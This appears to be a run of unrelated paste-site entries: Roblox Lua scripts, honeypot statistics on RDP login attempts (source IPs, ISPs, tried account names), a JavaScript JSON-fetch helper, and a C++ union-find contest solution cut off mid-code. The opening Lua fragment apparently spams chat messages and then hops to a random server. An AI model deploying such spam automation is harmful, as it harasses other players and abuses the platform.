    return HttpService:JSONDecode(game:HttpGet(servers .. ((cursor and ""&cursor=""..cursor) or """")))
end

local function SendMessages()
    for _, batch in messages do
        for index, message in batch do
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
            task.wait(0.5 + index / 5)
        end
        task.wait(1)
    end
end

local function HopServer()
    local x = ListServers()
    local server = x.data[math.random(1, #x.data)]
    TeleportService:TeleportToPlaceInstance(placeId, server.id, Players.LocalPlayer)
end

local t = task.spawn(function()
    SendMessages()
end)

task.wait(15)

task.cancel(t)

HopServer()"
QRgMqFJY,mc,eea,Lua,Tuesday 25th of June 2024 07:18:54 PM CDT,"local rs = game:GetService(""ReplicatedStorage"")

local place = Instance.new(""RemoteEvent"", rs)
place.Name = ""place""

local Log = Instance.new(""Tool"", owner.Backpack)
Log.Name = ""Log""
Log.RequiresHandle = false
Log.CanBeDropped = false


local Remove = Instance.new(""Tool"", owner.Backpack)
Remove.Name = ""Remove""
Remove.RequiresHandle = false
Remove.CanBeDropped = false

local remove = Instance.new(""RemoteEvent"", rs)
remove.Name = ""remove""

local wood = Instance.new(""Model"", rs)
wood.Name = ""wood""
wood:SetAttribute(""kaimc"", true)

local part1 = Instance.new('Part', wood) 
part1.Color = Color3.new(0.4117647111415863, 0.250980406999588, 0.1568627506494522) 
part1.Position = Vector3.new(-19.75, 2, 34.25) 
part1.Size = Vector3.new(0.5, 4, 3.5) 
part1.Material = Enum.Material.Plastic
part1.Anchored = true
part1.Orientation = Vector3.new(0, 0, 0) 
local part2 = Instance.new('Part', wood) 
part2.Color = Color3.new(0.7372549176216125, 0.6078431606292725, 0.364705890417099) 
part2.Position = Vector3.new(-19, 2, 33.5) 
part2.Size = Vector3.new(1, 4, 2) 
part2.Material = Enum.Material.Plastic
part2.Anchored = true
part2.Orientation = Vector3.new(0, 0, 0) 
local part3 = Instance.new('Part', wood) 
part3.Color = Color3.new(0.7372549176216125, 0.6078431606292725, 0.364705890417099) 
part3.Position = Vector3.new(-18.5, 2, 35) 
part3.Size = Vector3.new(2, 4, 1) 
part3.Material = Enum.Material.Plastic
part3.Anchored = true
part3.Orientation = Vector3.new(0, 0, 0) 
local part4 = Instance.new('Part', wood) 
part4.Color = Color3.new(0.6274510025978088, 0.5176470875740051, 0.30980393290519714) 
part4.Position = Vector3.new(-18, 2, 34) 
part4.Size = Vector3.new(1, 4, 1) 
part4.Material = Enum.Material.Plastic
part4.Anchored = true
part4.Orientation = Vector3.new(0, 0, 0) 
local part5 = Instance.new('Part', wood) 
part5.Color = Color3.new(0.4117647111415863, 0.250980406999588, 0.1568627506494522) 
part5.Position = Vector3.new(-18.25, 2, 32.25) 
part5.Size = Vector3.new(3.5, 4, 0.5) 
part5.Material = Enum.Material.Plastic
part5.Anchored = true
part5.Orientation = Vector3.new(0, 0, 0) 
local part6 = Instance.new('Part', wood) 
part6.Color = Color3.new(0.4117647111415863, 0.250980406999588, 0.1568627506494522) 
part6.Position = Vector3.new(-17.75, 2, 35.75) 
part6.Size = Vector3.new(3.5, 4, 0.5) 
part6.Material = Enum.Material.Plastic
part6.Anchored = true
part6.Orientation = Vector3.new(0, 0, 0) 
local part7 = Instance.new('Part', wood) 
part7.Color = Color3.new(0.7372549176216125, 0.6078431606292725, 0.364705890417099) 
part7.Position = Vector3.new(-17.5, 2, 33) 
part7.Size = Vector3.new(2, 4, 1) 
part7.Material = Enum.Material.Plastic
part7.Anchored = true
part7.Orientation = Vector3.new(0, 0, 0) 
local part8 = Instance.new('Part', wood) 
part8.Color = Color3.new(0.7372549176216125, 0.6078431606292725, 0.364705890417099) 
part8.Position = Vector3.new(-17, 2, 34.5) 
part8.Size = Vector3.new(1, 4, 2) 
part8.Material = Enum.Material.Plastic
part8.Anchored = true
part8.Orientation = Vector3.new(0, 0, 0) 
local part9 = Instance.new('Part', wood) 
part9.Color = Color3.new(0.4117647111415863, 0.250980406999588, 0.1568627506494522) 
part9.Position = Vector3.new(-16.25, 2, 33.75) 
part9.Size = Vector3.new(0.5, 4, 3.5) 
part9.Material = Enum.Material.Plastic
part9.Anchored = true
part9.Orientation = Vector3.new(0, 0, 0)

NLS([[
local plr = owner
local mouse = plr:GetMouse()
local uis = game:GetService(""UserInputService"")
local rs = game:GetService(""RunService"")
local cam = workspace.CurrentCamera
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild(""Humanoid"")
local root = char:WaitForChild(""HumanoidRootPart"")
local repstor = game:GetService(""ReplicatedStorage"")

-- tools
local Log = owner.Backpack:WaitForChild(""Log"")
local Remove = owner.Backpack:WaitForChild(""Remove"")

-- remoteevents
local place = repstor:WaitForChild(""place"")
local remove = repstor:WaitForChild(""remove"")

Log.Activated:Connect(function()
	if mouse.Target ~= nil then
		--print(mouse.TargetSurface)
		place:FireServer(""wood"", mouse.Target, mouse.TargetSurface.Value, mouse.Hit.Position)
	end
end)

Remove.Activated:Connect(function()
	if mouse.Target ~= nil then
		remove:FireServer(mouse.Target)
	end
end)
]], owner.Character)

local place = rs:WaitForChild(""place"")
local remove = rs:WaitForChild(""remove"")
local tilesize = 4
local SF = {
	[0] = Vector3.xAxis*tilesize;
	[1] = Vector3.yAxis*tilesize;
	[2] = Vector3.zAxis*tilesize;
	[3] = -Vector3.xAxis*tilesize;
	[4] = -Vector3.yAxis*tilesize;
	[5] = -Vector3.zAxis*tilesize;
}

function floor(v,t)
	return Vector3.new(math.floor(v.X/t)*t, math.floor(v.Y/t)*t, math.floor(v.Z/t)*t)
end

place.OnServerEvent:Connect(function(plr, block, target, surface, pos)
	local BLOCK = rs:WaitForChild(block):Clone()
	if target.Parent:GetAttribute(""kaimc"") then
		BLOCK.Parent = script
		BLOCK:PivotTo(CFrame.new(target.Parent.WorldPivot.Position + SF[surface]))
	else
		BLOCK.Parent = script
		BLOCK:PivotTo(CFrame.new(floor(pos, tilesize) + Vector3.one * tilesize * 0.5))
	end
end)

remove.OnServerEvent:Connect(function(plr, target)
	if target.Parent:GetAttribute(""kaimc"") then
		target.Parent:Destroy()
	end
end)"
8W8jXTSy,2024-06-25_stats.json,rdp_snitch,JSON,Tuesday 25th of June 2024 07:17:59 PM CDT,"{
  ""ip"": {
    ""213.109.202.251"": 24,
    ""222.132.26.43"": 6,
    ""164.92.104.215"": 12,
    ""223.166.31.100"": 3,
    ""68.183.187.219"": 6,
    ""194.165.16.73"": 6,
    ""45.227.254.26"": 6,
    ""116.140.196.215"": 6,
    ""46.23.108.240"": 3,
    ""81.19.135.2"": 9,
    ""104.248.154.46"": 24,
    ""192.53.120.191"": 6,
    ""206.168.34.38"": 3,
    ""149.34.246.34"": 3,
    ""147.78.47.97"": 6,
    ""147.185.132.213"": 9,
    ""23.102.143.185"": 3,
    ""152.32.243.98"": 3,
    ""185.150.1.204"": 6,
    ""185.170.144.3"": 6,
    ""64.124.50.139"": 6,
    ""80.66.66.250"": 9,
    ""187.157.89.218"": 3,
    ""103.121.74.4"": 3,
    ""185.196.220.41"": 9,
    ""198.235.24.87"": 9,
    ""60.255.174.158"": 3,
    ""194.26.135.155"": 9,
    ""45.227.254.54"": 6,
    ""194.165.16.10"": 12,
    ""194.180.49.249"": 6,
    ""103.186.45.94"": 3,
    ""103.130.145.142"": 6,
    ""194.165.16.11"": 6,
    ""51.103.90.130"": 3,
    ""147.185.132.36"": 9,
    ""87.251.75.64"": 3,
    ""162.142.125.199"": 3,
    ""205.210.31.210"": 9
  },
  ""asn"": {
    ""AS208312"": 24,
    ""AS4837"": 15,
    ""AS14061"": 42,
    ""AS17621"": 3,
    ""AS48721"": 24,
    ""AS267784"": 12,
    ""AS215762"": 3,
    ""AS209588"": 15,
    ""AS63949"": 6,
    ""AS398324"": 6,
    ""AS212238"": 3,
    ""AS396982"": 36,
    ""AS8075"": 6,
    ""AS135377"": 3,
    ""AS212396"": 6,
    ""AS197414"": 6,
    ""AS6461"": 6,
    ""AS51765"": 9,
    ""AS8151"": 3,
    ""AS134886"": 3,
    ""AS208046"": 9,
    ""AS57523"": 9,
    ""AS201814"": 6,
    ""AS133676"": 3,
    ""AS34394"": 6,
    ""AS208091"": 3
  },
  ""isp"": {
    ""Red Byte LLC"": 24,
    ""CHINA UNICOM China169 Backbone"": 6,
    ""DigitalOcean, LLC"": 42,
    ""China Unicom Shanghai Province Network"": 3,
    ""Flyservers S.A."": 51,
    ""China Unicom CHINA169 Network"": 6,
    ""Bullet Group LTD"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Censys, Inc."": 6,
    ""Datacamp Limited"": 3,
    ""Google LLC"": 36,
    ""Microsoft Corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""FyfeWeb Ltd"": 6,
    ""Xhost Internet Solutions LP"": 9,
    ""Zayo Bandwidth"": 6,
    ""Oy Crea Nova Hosting Solution Ltd"": 9,
    ""Uninet S.A. de C.V."": 3,
    ""Super Sonic Broadband Pvt. Ltd"": 3,
    ""ColocationX Ltd."": 9,
    ""China Unicom China169 Network"": 3,
    ""Chang Way Technologies Co. Limited"": 9,
    ""MEVSPACE sp. z o.o."": 6,
    ""Precious netcom pvt ltd"": 3,
    ""Digi Turunc"": 6,
    ""Microsoft"": 3
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 33,
    ""Wfedune EDU"": 6,
    ""DigitalOcean, LLC"": 42,
    ""Unknown"": 3,
    ""Flyservers S.A"": 30,
    ""UAB Host Baltic"": 12,
    ""China United Network Communications Corporation Limited"": 6,
    ""Bullet Group LTD"": 3,
    ""Alviva Holding Limited"": 9,
    ""Linode, LLC"": 6,
    ""Censys Inc"": 6,
    ""Datacamp Limited"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Microsoft Azure Cloud (southcentralus)"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""FyfeWeb Ltd"": 6,
    ""Xhostis"": 6,
    ""Microsoft Corporation"": 6,
    ""Xhost Internet Solutions"": 12,
    ""Uninet S.A. de C.V."": 3,
    ""Super Sonic Broadband Pvt Ltd"": 3,
    ""Makut Investments"": 9,
    ""SiChuan Cable TV Network CO., LTD"": 3,
    ""HostSlick"": 6,
    ""Spenterpr"": 3,
    ""Turunc Smart Bilgisayar Ve Teknoloji Ve Dis Tecaret Limited"": 6,
    ""Microsoft Azure Cloud (francecentral)"": 3
  },
  ""regionName"": {
    ""Moscow"": 33,
    ""Beijing"": 12,
    ""California"": 48,
    ""Shanghai"": 3,
    ""South West"": 6,
    ""Kaunas"": 24,
    ""Vilnius"": 12,
    ""Kelantan"": 3,
    ""Hesse"": 12,
    ""Central Singapore"": 24,
    ""Ontario"": 6,
    ""Illinois"": 3,
    ""North Holland"": 15,
    ""Texas"": 3,
    ""Seoul"": 3,
    ""England"": 6,
    ""Virginia"": 21,
    ""Uusimaa"": 9,
    ""Mexico City"": 3,
    ""Maharashtra"": 3,
    ""Sichuan"": 3,
    ""National Capital Territory of Delhi"": 3,
    ""Istanbul"": 6,
    ""\u00cele-de-France"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Russia"": 33,
    ""China"": 18,
    ""United States"": 78,
    ""Singapore"": 30,
    ""Lithuania"": 36,
    ""Malaysia"": 3,
    ""Germany"": 12,
    ""Canada"": 6,
    ""The Netherlands"": 15,
    ""South Korea"": 3,
    ""United Kingdom"": 6,
    ""Finland"": 9,
    ""Mexico"": 3,
    ""India"": 6,
    ""Turkey"": 6,
    ""France"": 3
  },
  ""account"": {
    ""Test"": 66,
    ""hello"": 81,
    ""(empty)"": 21,
    ""Administr"": 21,
    ""Domain"": 39,
    ""QmbExSlhj"": 3,
    ""yksliN"": 3,
    ""LOJUZl"": 3,
    ""Administrator"": 3,
    ""JxuDmRAJJ"": 3,
    ""xaFMWQ"": 3,
    ""WbMXzZ"": 3,
    ""KFAZZguWV"": 3,
    ""jlmETt"": 3,
    ""OvXMOJ"": 3,
    ""uGCgkPBAD"": 3,
    ""xkVooQ"": 3,
    ""MwZesw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 267
  },
  ""client_build"": {
    ""Unknown"": 267
  },
  ""client_name"": {
    ""Unknown"": 267
  },
  ""ip_type"": {
    ""proxy"": 39,
    ""Unknown"": 123,
    ""hosting"": 102,
    ""hosting & proxy"": 3
  }
}"
NfYg1tRS,2024-06-25_stats.json,rdp_snitch,JSON,Tuesday 25th of June 2024 07:16:04 PM CDT,"{
  ""ip"": {
    ""213.109.202.251"": 16,
    ""222.132.26.43"": 4,
    ""164.92.104.215"": 8,
    ""223.166.31.100"": 2,
    ""68.183.187.219"": 4,
    ""194.165.16.73"": 4,
    ""45.227.254.26"": 4,
    ""116.140.196.215"": 4,
    ""46.23.108.240"": 2,
    ""81.19.135.2"": 6,
    ""104.248.154.46"": 16,
    ""192.53.120.191"": 4,
    ""206.168.34.38"": 2,
    ""149.34.246.34"": 2,
    ""147.78.47.97"": 4,
    ""147.185.132.213"": 6,
    ""23.102.143.185"": 2,
    ""152.32.243.98"": 2,
    ""185.150.1.204"": 4,
    ""185.170.144.3"": 4,
    ""64.124.50.139"": 4,
    ""80.66.66.250"": 6,
    ""187.157.89.218"": 2,
    ""103.121.74.4"": 2,
    ""185.196.220.41"": 6,
    ""198.235.24.87"": 6,
    ""60.255.174.158"": 2,
    ""194.26.135.155"": 6,
    ""45.227.254.54"": 4,
    ""194.165.16.10"": 8,
    ""194.180.49.249"": 4,
    ""103.186.45.94"": 2,
    ""103.130.145.142"": 4,
    ""194.165.16.11"": 4,
    ""51.103.90.130"": 2,
    ""147.185.132.36"": 6,
    ""87.251.75.64"": 2,
    ""162.142.125.199"": 2,
    ""205.210.31.210"": 6
  },
  ""asn"": {
    ""AS208312"": 16,
    ""AS4837"": 10,
    ""AS14061"": 28,
    ""AS17621"": 2,
    ""AS48721"": 16,
    ""AS267784"": 8,
    ""AS215762"": 2,
    ""AS209588"": 10,
    ""AS63949"": 4,
    ""AS398324"": 4,
    ""AS212238"": 2,
    ""AS396982"": 24,
    ""AS8075"": 4,
    ""AS135377"": 2,
    ""AS212396"": 4,
    ""AS197414"": 4,
    ""AS6461"": 4,
    ""AS51765"": 6,
    ""AS8151"": 2,
    ""AS134886"": 2,
    ""AS208046"": 6,
    ""AS57523"": 6,
    ""AS201814"": 4,
    ""AS133676"": 2,
    ""AS34394"": 4,
    ""AS208091"": 2
  },
  ""isp"": {
    ""Red Byte LLC"": 16,
    ""CHINA UNICOM China169 Backbone"": 4,
    ""DigitalOcean, LLC"": 28,
    ""China Unicom Shanghai Province Network"": 2,
    ""Flyservers S.A."": 34,
    ""China Unicom CHINA169 Network"": 4,
    ""Bullet Group LTD"": 2,
    ""Akamai Technologies, Inc."": 4,
    ""Censys, Inc."": 4,
    ""Datacamp Limited"": 2,
    ""Google LLC"": 24,
    ""Microsoft Corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""FyfeWeb Ltd"": 4,
    ""Xhost Internet Solutions LP"": 6,
    ""Zayo Bandwidth"": 4,
    ""Oy Crea Nova Hosting Solution Ltd"": 6,
    ""Uninet S.A. de C.V."": 2,
    ""Super Sonic Broadband Pvt. Ltd"": 2,
    ""ColocationX Ltd."": 6,
    ""China Unicom China169 Network"": 2,
    ""Chang Way Technologies Co. Limited"": 6,
    ""MEVSPACE sp. z o.o."": 4,
    ""Precious netcom pvt ltd"": 2,
    ""Digi Turunc"": 4,
    ""Microsoft"": 2
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 22,
    ""Wfedune EDU"": 4,
    ""DigitalOcean, LLC"": 28,
    ""Unknown"": 2,
    ""Flyservers S.A"": 20,
    ""UAB Host Baltic"": 8,
    ""China United Network Communications Corporation Limited"": 4,
    ""Bullet Group LTD"": 2,
    ""Alviva Holding Limited"": 6,
    ""Linode, LLC"": 4,
    ""Censys Inc"": 4,
    ""Datacamp Limited"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Microsoft Azure Cloud (southcentralus)"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""FyfeWeb Ltd"": 4,
    ""Xhostis"": 4,
    ""Microsoft Corporation"": 4,
    ""Xhost Internet Solutions"": 8,
    ""Uninet S.A. de C.V."": 2,
    ""Super Sonic Broadband Pvt Ltd"": 2,
    ""Makut Investments"": 6,
    ""SiChuan Cable TV Network CO., LTD"": 2,
    ""HostSlick"": 4,
    ""Spenterpr"": 2,
    ""Turunc Smart Bilgisayar Ve Teknoloji Ve Dis Tecaret Limited"": 4,
    ""Microsoft Azure Cloud (francecentral)"": 2
  },
  ""regionName"": {
    ""Moscow"": 22,
    ""Beijing"": 8,
    ""California"": 32,
    ""Shanghai"": 2,
    ""South West"": 4,
    ""Kaunas"": 16,
    ""Vilnius"": 8,
    ""Kelantan"": 2,
    ""Hesse"": 8,
    ""Central Singapore"": 16,
    ""Ontario"": 4,
    ""Illinois"": 2,
    ""North Holland"": 10,
    ""Texas"": 2,
    ""Seoul"": 2,
    ""England"": 4,
    ""Virginia"": 14,
    ""Uusimaa"": 6,
    ""Mexico City"": 2,
    ""Maharashtra"": 2,
    ""Sichuan"": 2,
    ""National Capital Territory of Delhi"": 2,
    ""Istanbul"": 4,
    ""\u00cele-de-France"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""Russia"": 22,
    ""China"": 12,
    ""United States"": 52,
    ""Singapore"": 20,
    ""Lithuania"": 24,
    ""Malaysia"": 2,
    ""Germany"": 8,
    ""Canada"": 4,
    ""The Netherlands"": 10,
    ""South Korea"": 2,
    ""United Kingdom"": 4,
    ""Finland"": 6,
    ""Mexico"": 2,
    ""India"": 4,
    ""Turkey"": 4,
    ""France"": 2
  },
  ""account"": {
    ""Test"": 44,
    ""hello"": 54,
    ""(empty)"": 14,
    ""Administr"": 14,
    ""Domain"": 26,
    ""QmbExSlhj"": 2,
    ""yksliN"": 2,
    ""LOJUZl"": 2,
    ""Administrator"": 2,
    ""JxuDmRAJJ"": 2,
    ""xaFMWQ"": 2,
    ""WbMXzZ"": 2,
    ""KFAZZguWV"": 2,
    ""jlmETt"": 2,
    ""OvXMOJ"": 2,
    ""uGCgkPBAD"": 2,
    ""xkVooQ"": 2,
    ""MwZesw"": 2
  },
  ""keyboard"": {
    ""Unknown"": 178
  },
  ""client_build"": {
    ""Unknown"": 178
  },
  ""client_name"": {
    ""Unknown"": 178
  },
  ""ip_type"": {
    ""proxy"": 26,
    ""Unknown"": 82,
    ""hosting"": 68,
    ""hosting & proxy"": 2
  }
}"
DzjE1jXk,2024-06-25_stats.json,rdp_snitch,JSON,Tuesday 25th of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""213.109.202.251"": 8,
    ""222.132.26.43"": 2,
    ""164.92.104.215"": 4,
    ""223.166.31.100"": 1,
    ""68.183.187.219"": 2,
    ""194.165.16.73"": 2,
    ""45.227.254.26"": 2,
    ""116.140.196.215"": 2,
    ""46.23.108.240"": 1,
    ""81.19.135.2"": 3,
    ""104.248.154.46"": 8,
    ""192.53.120.191"": 2,
    ""206.168.34.38"": 1,
    ""149.34.246.34"": 1,
    ""147.78.47.97"": 2,
    ""147.185.132.213"": 3,
    ""23.102.143.185"": 1,
    ""152.32.243.98"": 1,
    ""185.150.1.204"": 2,
    ""185.170.144.3"": 2,
    ""64.124.50.139"": 2,
    ""80.66.66.250"": 3,
    ""187.157.89.218"": 1,
    ""103.121.74.4"": 1,
    ""185.196.220.41"": 3,
    ""198.235.24.87"": 3,
    ""60.255.174.158"": 1,
    ""194.26.135.155"": 3,
    ""45.227.254.54"": 2,
    ""194.165.16.10"": 4,
    ""194.180.49.249"": 2,
    ""103.186.45.94"": 1,
    ""103.130.145.142"": 2,
    ""194.165.16.11"": 2,
    ""51.103.90.130"": 1,
    ""147.185.132.36"": 3,
    ""87.251.75.64"": 1,
    ""162.142.125.199"": 1,
    ""205.210.31.210"": 3
  },
  ""asn"": {
    ""AS208312"": 8,
    ""AS4837"": 5,
    ""AS14061"": 14,
    ""AS17621"": 1,
    ""AS48721"": 8,
    ""AS267784"": 4,
    ""AS215762"": 1,
    ""AS209588"": 5,
    ""AS63949"": 2,
    ""AS398324"": 2,
    ""AS212238"": 1,
    ""AS396982"": 12,
    ""AS8075"": 2,
    ""AS135377"": 1,
    ""AS212396"": 2,
    ""AS197414"": 2,
    ""AS6461"": 2,
    ""AS51765"": 3,
    ""AS8151"": 1,
    ""AS134886"": 1,
    ""AS208046"": 3,
    ""AS57523"": 3,
    ""AS201814"": 2,
    ""AS133676"": 1,
    ""AS34394"": 2,
    ""AS208091"": 1
  },
  ""isp"": {
    ""Red Byte LLC"": 8,
    ""CHINA UNICOM China169 Backbone"": 2,
    ""DigitalOcean, LLC"": 14,
    ""China Unicom Shanghai Province Network"": 1,
    ""Flyservers S.A."": 17,
    ""China Unicom CHINA169 Network"": 2,
    ""Bullet Group LTD"": 1,
    ""Akamai Technologies, Inc."": 2,
    ""Censys, Inc."": 2,
    ""Datacamp Limited"": 1,
    ""Google LLC"": 12,
    ""Microsoft Corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""FyfeWeb Ltd"": 2,
    ""Xhost Internet Solutions LP"": 3,
    ""Zayo Bandwidth"": 2,
    ""Oy Crea Nova Hosting Solution Ltd"": 3,
    ""Uninet S.A. de C.V."": 1,
    ""Super Sonic Broadband Pvt. Ltd"": 1,
    ""ColocationX Ltd."": 3,
    ""China Unicom China169 Network"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""MEVSPACE sp. z o.o."": 2,
    ""Precious netcom pvt ltd"": 1,
    ""Digi Turunc"": 2,
    ""Microsoft"": 1
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 11,
    ""Wfedune EDU"": 2,
    ""DigitalOcean, LLC"": 14,
    ""Unknown"": 1,
    ""Flyservers S.A"": 10,
    ""UAB Host Baltic"": 4,
    ""China United Network Communications Corporation Limited"": 2,
    ""Bullet Group LTD"": 1,
    ""Alviva Holding Limited"": 3,
    ""Linode, LLC"": 2,
    ""Censys Inc"": 2,
    ""Datacamp Limited"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Azure Cloud (southcentralus)"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""FyfeWeb Ltd"": 2,
    ""Xhostis"": 2,
    ""Microsoft Corporation"": 2,
    ""Xhost Internet Solutions"": 4,
    ""Uninet S.A. de C.V."": 1,
    ""Super Sonic Broadband Pvt Ltd"": 1,
    ""Makut Investments"": 3,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""HostSlick"": 2,
    ""Spenterpr"": 1,
    ""Turunc Smart Bilgisayar Ve Teknoloji Ve Dis Tecaret Limited"": 2,
    ""Microsoft Azure Cloud (francecentral)"": 1
  },
  ""regionName"": {
    ""Moscow"": 11,
    ""Beijing"": 4,
    ""California"": 16,
    ""Shanghai"": 1,
    ""South West"": 2,
    ""Kaunas"": 8,
    ""Vilnius"": 4,
    ""Kelantan"": 1,
    ""Hesse"": 4,
    ""Central Singapore"": 8,
    ""Ontario"": 2,
    ""Illinois"": 1,
    ""North Holland"": 5,
    ""Texas"": 1,
    ""Seoul"": 1,
    ""England"": 2,
    ""Virginia"": 7,
    ""Uusimaa"": 3,
    ""Mexico City"": 1,
    ""Maharashtra"": 1,
    ""Sichuan"": 1,
    ""National Capital Territory of Delhi"": 1,
    ""Istanbul"": 2,
    ""\u00cele-de-France"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""Russia"": 11,
    ""China"": 6,
    ""United States"": 26,
    ""Singapore"": 10,
    ""Lithuania"": 12,
    ""Malaysia"": 1,
    ""Germany"": 4,
    ""Canada"": 2,
    ""The Netherlands"": 5,
    ""South Korea"": 1,
    ""United Kingdom"": 2,
    ""Finland"": 3,
    ""Mexico"": 1,
    ""India"": 2,
    ""Turkey"": 2,
    ""France"": 1
  },
  ""account"": {
    ""Test"": 22,
    ""hello"": 27,
    ""(empty)"": 7,
    ""Administr"": 7,
    ""Domain"": 13,
    ""QmbExSlhj"": 1,
    ""yksliN"": 1,
    ""LOJUZl"": 1,
    ""Administrator"": 1,
    ""JxuDmRAJJ"": 1,
    ""xaFMWQ"": 1,
    ""WbMXzZ"": 1,
    ""KFAZZguWV"": 1,
    ""jlmETt"": 1,
    ""OvXMOJ"": 1,
    ""uGCgkPBAD"": 1,
    ""xkVooQ"": 1,
    ""MwZesw"": 1
  },
  ""keyboard"": {
    ""Unknown"": 89
  },
  ""client_build"": {
    ""Unknown"": 89
  },
  ""client_name"": {
    ""Unknown"": 89
  },
  ""ip_type"": {
    ""proxy"": 13,
    ""Unknown"": 41,
    ""hosting"": 34,
    ""hosting & proxy"": 1
  }
}"
Sstjgw2H,Roe2Js :: loadJSONDirect ( ),jargon,JavaScript,Tuesday 25th of June 2024 06:58:09 PM CDT,"// Function to load JSON
function loadJSON(url) {
	
	console.log(`Requesting: ""` + basename(url,`.json`) + `""`);

	if(basename(url,`.json`) === `[object Promise]`){
		return false;
	}

	if(basename(url,`.json`) === `undefined`){
		return false;
	}
	
	// Ensure the URL starts with the host
	if ( !url.startsWith( host ) ) {
		url = `${host}${url}`;
	}
				
	let originalRequest = ``;
	
	let addy = ``;
	
	if(instr(url,`//`)){
		addy = url.split(`//`)[1];
	}else{
		addy = url;
	}
	
	addy = addy.split(`/`);
	let addy2 = ``;
	for(index = 1; index < addy.length - 1; index++){
		if(addy[index]!==``){
			addy2 += `/${addy[index]}`;
		}
	}
	
	addy3 = addy2.split(`/`);
	
	let nestRequest = ``;
	
	for(index = 2; index <= 2; index++){
		nestRequest += `/${addy3[index]}`;
	}

	for(index = 3; index < addy.length; index++){
		originalRequest += `/${addy[index]}`;
	}
	let requestPath=`${addy[0]}`;

	// Replace spaces with %20
	url = url.replace(/ /g, '%20');

	// Fetch the JSON file
	return fetch(url)
		.then(response => {
			if (!response.ok) {
				throw new Error(`Oh, Noez!! It was a bad network response\n\nunder ""${nestRequest}"" in ""${originalRequest}"" (${response.statusText})\n\n`);
			}
			return response.json();
		})
		.then(data => {
			console.log(`Woot!! Data fetched!\n\nunder ""${nestRequest}"" in ""${originalRequest}""\n\n`, data);
			return data;
		})
		.catch(error => {
			console.error(`Oh, Noez!! There has been a problem with your fetch operation!\n\nunder ""${nestRequest}"" in ""${originalRequest}""\n\n`, error);
		});
}

function fileExists(url) {

	// Ensure the URL starts with the host
	if ( !url.startsWith( host ) ) {
		url = `${host}${url}`;
	}
			
	// Replace spaces with %20
	url = url.replace(/ /g, '%20');

    try {
        const response = fetch(url, { method: 'HEAD' });
        return response.status === 200;
    } catch (error) {
        console.error(`Oh, Noez!! Error fetching the file!\n\n""${url}""`, error);
        return false;
    }
}

function basename(path = ``, ext = ``) {
	
	let intermediate = path.split(`/`);
	
	intermediate = intermediate[intermediate.length - 1];
	
	if ( ext === right( intermediate, len( ext ) ) ) {
		intermediate = left( intermediate, len( intermediate ) - len( ext ));
	}
	
	return intermediate;
}

function loadJSONDirect(url){
	let intermediate = [loadJSON(url)][0];
	console.log(intermediate);
	return intermediate;
}"
eY60pWhX,War,gustavohenriquefs,C++,Tuesday 25th of June 2024 06:34:48 PM CDT,"// https://onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=16&page=show_problem&problem=1099
// AC

#include <bits/stdc++.h>
using namespace std;

#define vt vector
#define all(x) x.begin(), x.end()
#define rall(x) x.rbegin(), x.rend()
#define pb push_back
#ifdef DEBUG
#define debug_loop(l, r) for(int i = l; i <= r; ++ i)
#define debug(args...) printf(args); printf(""\n"")
#else
#define debug_loop(l, r) for(int i; false;)
#define debug(args...)
#endif

#define fi first
#define se second

#define sz(x) (int)x.size()

typedef int64_t i64;
typedef long long ll;
typedef pair<int, int> pii;

#define nl '\n'

const int maxn = 40101;

vt<int> parent(maxn), size_of(maxn);
vt<set<int>> enemies(maxn);

void make_set(int v) {
  parent[v] = v;
}

int find_set(int v) {
  return (parent[v] == v) ? v : (parent[v] = find_set(parent[v]));
}

void union_sets(int a, int b, int skip = false) {
  a = find_set(a),
  b = find_set(b);

  if(sz(enemies[a]) && sz(enemies[b]) && !skip) {
    union_sets((*enemies[b].begin()), (*enemies[a].begin()), true);
  }

  if(a == b) return;

  enemies[a].insert(all(enemies[b]));
  enemies[b].insert(all(enemies[a]));
  
  if(size_of[a] < size_of[b]) swap(a, b);

  parent[b] = a;

  size_of[a] += size_of[b];
}

void union_enemies(int a, int b) {
  a = find_set(a);
  b = find_set(b);

  if(sz(enemies[a])) {
    union_sets(b, *enemies[a].begin());
  }

  if(sz(enemies[b])) {
    union_sets(a, *enemies[b].begin());
  }

  a = find_set(a);
  b = find_set(b);

  enemies[a].insert(b);
  enemies[b].insert(a);
}

bool is_enemies(int a, int b) {
  a = find_set(a);
  b = find_set(b);

  auto it = enemies[a].begin();
  bool ans = false;

  for(auto i = it; i != enemies[a].end();) {
    const int id = find_set(*i);

    if(id != *i) {
      i = enemies[a].erase(i);
      enemies[a].insert(id);
    } else {
      ++ i;
    }

    if(id == b) ans = true;
  }

  it = enemies[b].begin();

  for(auto i = it; i != enemies[b].end();) {
    const int id = find_set(*i);

    if(id != *i) {
      i = enemies[b].erase(i);
      enemies[b].insert(id);
    } else {
      ++ i;
    }

    if(id == a) ans = true;
  }

  return ans;
}

bool is_friends(int a, int b) {
  a = find_set(a); 
  b = find_set(b);

  return a == b;
}

int main() {
  cin.tie(0)->sync_with_stdio(0);

  int n; cin >> n;

  for(int i = 0; i <= n + 100; ++ i) {
    make_set(i);
  }

  int c, x, y = 1; 

  while (true) {
    cin >> c >> x >> y;

    if(!(c or x or y)) break;

    if(c == 1) {
      if(is_enemies(x, y)) {
